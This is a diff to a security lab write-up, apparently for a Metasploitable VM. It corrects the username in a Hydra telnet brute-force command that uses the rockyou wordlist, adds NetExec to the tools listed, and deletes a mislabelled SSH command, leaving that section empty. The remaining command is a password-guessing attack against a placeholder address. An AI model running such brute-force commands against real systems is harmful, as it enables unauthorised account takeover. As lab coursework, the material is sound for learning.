@@ -25,8 +25,8 @@ The goal of this lab is to explore the vulnerabilities of common network protoco
 
 **Assumed Username**: Based on enumeration or hints from the VM, we assumed the username is `msfadmin`.
 
-**Tool Used**: Hydra  
-**Wordlist Used**: `/usr/share/wordlists/rockyou.txt`
+**Tool Used**: Hydra & NetExec 
+**Wordlist Used**: `/usr/share/wordlists/rockyou.txt
 
 **Commands Used**:
 
@@ -36,9 +36,7 @@ The goal of this lab is to explore the vulnerabilities of common network protoco
   ```
 - **TELNET**:
   ```bash
-  hydra -l masfadmin -P /usr/share/wordlists/rockyou.txt telnet://192.168.X.X
+  hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt telnet://192.168.X.X
   ```
 - **SSH**:
-  ```bash
-  hydra -l masfadmin -P /usr/share/wordlists/rockyou.txt telnet://192.168.X.X
-  ```
+  
